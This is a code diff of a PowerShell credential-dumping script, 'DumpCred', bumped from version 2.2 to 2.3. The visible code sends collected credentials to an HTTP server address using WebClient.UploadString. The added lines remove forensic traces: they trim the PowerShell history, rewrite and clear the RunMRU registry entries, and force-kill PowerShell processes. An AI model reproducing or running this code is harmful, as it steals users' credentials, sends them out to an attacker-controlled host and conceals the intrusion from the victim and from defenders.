@@ -1,7 +1,7 @@
 ﻿
 <#
 .SYNOPSIS
-   DumpCred 2.2
+   DumpCred 2.3
 .DESCRIPTION
    Dumps all Creds from a PC 
 .PARAMETER <paramName>
@@ -12,8 +12,8 @@
 
 
 
-$_Version = "2.2.0"
-$_BUILD = "1008"
+$_Version = "2.3.1"
+$_BUILD = "1011"
 
 # Encoded File Info
 $HTTP_Server="172.16.64.1"
@@ -141,8 +141,48 @@ $OUT = $out.Replace([char][int]10, "`n")
 (New-Object Net.WebClient).UploadString('http://' + $HTTP_Server +'/' + $env:COMPUTERNAME, $OUT)
 (New-Object Net.WebClient).UploadString('http://' + $HTTP_Server + '/EOF', 'EOF');
 
-#  Epmty Run Input Field
+
+
+# Remove Last Lines from History and Reg
+# Powershell History
+$a = Get-Content "$env:TEMP\~ps199876af.tmp"
+$b = $a[0..($a.count - 2)]
+$b | set-Content "$env:TEMP\~ps199876af.tmp"
+
+# Remove last command from RunMRU saved file 
+#======================================================================
+$oMRU = New-Object System.Collections.ArrayList
+
+$list = get-content "$env:TEMP\~tg199876cb.tmp"
+$mrulist = (($list | Where-Object {$_.contains("MRUList")}) -split "=")[1] -replace '"' , ''
+$MRUarr = $mrulist.ToCharArray() |Sort-Object -Descending
+$hChar =$MRUarr[0]
+$MRUarr = $MRUarr[1..($MRUarr.Length-1)]
+$mrulist = -join $MRUarr
+$larr = $list -split 0x0D, 0x0A
+
+
+for ($i = 0; $i -le $larr.GetUpperBound(0); $i++) {
+    if ($larr[$i] | Where-Object {$_.contains("MRUList")}) {
+        $s = '"MRUList"="' + $mrulist + '"'
+        $oMRU.add("$s") >$null
+        $i++
+    }
+    if (-not ($larr[$i] | Where-Object {$_.contains('"' + $hChar + '"=')})) {
+        $oMRU.add($larr[$i]) >$null
+    }
+}
+#### for debugging uncomment vars
+#$hChar
+#$mrulist
+#foreach ($element in $oMRU) {$element}
+#### Debugging end 
+
+#  Epmty Run Input Field Restore changed file
 Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentContinue
+remove-item "$env:TEMP\~tg199876cb.tmp" -ErrorAction Continue
+foreach ($element in $oMRU) {$element |Out-File "$env:TEMP\~tg199876cb.tmp" -Append -ErrorAction Continue}
+
 
 # Kill all Powershell Tasks
 taskkill /F /IM powershell.exe
